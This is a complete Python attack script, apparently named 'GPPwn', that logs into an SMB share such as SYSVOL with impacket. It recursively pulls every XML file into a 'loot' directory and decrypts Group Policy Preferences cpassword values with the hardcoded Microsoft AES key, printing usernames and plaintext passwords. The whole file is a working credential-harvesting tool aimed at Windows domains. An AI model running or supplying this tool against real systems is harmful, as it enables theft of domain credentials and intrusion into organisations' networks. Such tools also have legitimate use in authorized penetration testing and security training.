#!/usr/bin/env python3

from impacket.smbconnection import SMBConnection
import argparse
import os
import base64
from Cryptodome.Cipher import AES
from lxml import etree




parser = argparse.ArgumentParser(description="SMB GPP Extractor")
parser.add_argument("-targetip", help="IP Address of the remote SMB share", required=True)
parser.add_argument("-username", help="Username", required=True)
parser.add_argument("-password", help="Password", required=True)
parser.add_argument("-sharename", help="Share name (e.g., 'SYSVOL')", required=True)
args = parser.parse_args()


def rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m"

RESET = "\033[0m"
BOLD = "\033[1m"


COLOR_HEADER = rgb(0, 180, 255)   
COLOR_USER   = rgb(255, 200, 0)  
COLOR_PASS   = rgb(50, 220, 50)   
COLOR_FILE   = rgb(200, 200, 200) 
COLOR_PLUS   = rgb(50, 220, 50)   
COLOR_XML    = rgb(0, 200, 255)   
COLOR_WARN   = rgb(255, 180, 0)   
COLOR_ERR    = rgb(255, 80, 80)  


BANNER = f"""
{rgb(0,255,100)}  ██████╗ {rgb(0,200,255)}██████╗ {rgb(0,255,100)}██████╗ {rgb(255,80,80)}██╗    ██╗███╗   ██╗
{rgb(0,255,100)} ██╔═══██╗{rgb(0,200,255)}██╔══██╗{rgb(0,255,100)}██╔══██╗{rgb(255,80,80)}██║    ██║████╗  ██║
{rgb(0,255,100)} ██║  ███║{rgb(0,200,255)}██████╔╝{rgb(0,255,100)}██████╔╝{rgb(255,80,80)}██║ █╗ ██║██╔██╗ ██║
{rgb(0,255,100)} ██║   ██║{rgb(0,200,255)}██╔═══╝ {rgb(0,255,100)}██╔═══╝ {rgb(255,80,80)}██║███╗██║██║╚██╗██║
{rgb(0,255,100)} ╚██████╔╝{rgb(0,200,255)}██║     {rgb(0,255,100)}██║     {rgb(255,80,80)}╚███╔███╔╝██║ ╚████║
{rgb(0,255,100)}  ╚═════╝ {rgb(0,200,255)}╚═╝     {rgb(0,255,100)}╚═╝     {rgb(255,80,80)} ╚══╝╚══╝ ╚═╝  ╚═══╝{RESET}

       {rgb(50, 220, 50)}  {BOLD}GPPwn - SMB GPP Extractor {RESET}
       {rgb(50, 220, 50)}  {BOLD}@x4c1s {RESET}
"""

 

def decrypt_cpassword(cpass):

    try:
        
        padding = '=' * ((4 - len(cpass) % 4) % 4)
        epass = cpass + padding
        decoded = base64.b64decode(epass)

        key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8' \
              b'\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'
        iv = b'\x00' * 16

        aes = AES.new(key, AES.MODE_CBC, iv)
        decrypted_raw = aes.decrypt(decoded)

        try:
            decrypted = decrypted_raw.decode('ascii').strip()
        except UnicodeDecodeError:
            decrypted = decrypted_raw.decode('utf-16le', errors='ignore').rstrip('\x00')

        return decrypted
    except Exception as e:
        return f"[!] Decryption failed: {e}"


def extract_gpp_creds(file_path):
    try:
        tree = etree.parse(file_path)
        root = tree.getroot()
        for element in root.iter():
            if 'cpassword' in element.attrib:
                user = element.attrib.get('userName', 'Unknown')
                cpass = element.attrib['cpassword']
                decrypted = decrypt_cpassword(cpass)

                print(f"\n{BOLD}{COLOR_HEADER}{'=' * 70}{RESET}")
                print(f"{BOLD}{COLOR_HEADER}[GPP CREDENTIAL FOUND]{RESET}")
                print(f"{COLOR_FILE}  File     : {RESET}{file_path}")
                print(f"{COLOR_USER}  Username : {RESET}{user}")
                print(f"{COLOR_USER}  Password : {RESET}{COLOR_PASS}{decrypted}{RESET}")
                print(f"{BOLD}{COLOR_HEADER}{'=' * 70}{RESET}\n")
    except Exception:
        pass


def download_file(remote_path):
    local_path = os.path.join("loot", remote_path.replace("/", os.sep))
    os.makedirs(os.path.dirname(local_path), exist_ok=True)
    try:
        with open(local_path, "wb") as f:
            c.getFile(args.sharename, f"/{remote_path}", f.write)
        print(f"[{COLOR_PLUS}+{RESET}] Downloaded: -> {local_path}")
       
        if local_path.lower().endswith(".xml"):
            extract_gpp_creds(local_path)

    except Exception as e:
        print(f"[!] Failed to download {remote_path}: {e}")


def walk_path(path):
    try:
        entries = c.listPath(args.sharename, path + '/*')
    except Exception as e:
        print(f"[!] Error accessing '{path}': {e}")
        return

    for f_entry in entries:
        name = f_entry.get_longname()
        if name in ('.', '..'):
            continue

        full_path = f"{path}/{name}" if path else name

        if f_entry.is_directory():
            walk_path(full_path)
        else:
            if name.lower().endswith('.xml'):
                print(f"[{COLOR_PLUS}XML{RESET}] Found: {full_path}")
                download_file(full_path)


def conn_smb():
    global c
    c = SMBConnection(args.targetip, args.targetip)
    c.login(args.username, args.password)
    print(f"[{COLOR_PLUS}+{RESET}] Connected to {args.targetip}, scanning {args.sharename} for {rgb(50, 220, 50)} {BOLD}.xml {RESET} files...\n")
    walk_path('')

if __name__ == "__main__":
    print(BANNER)
    conn_smb()
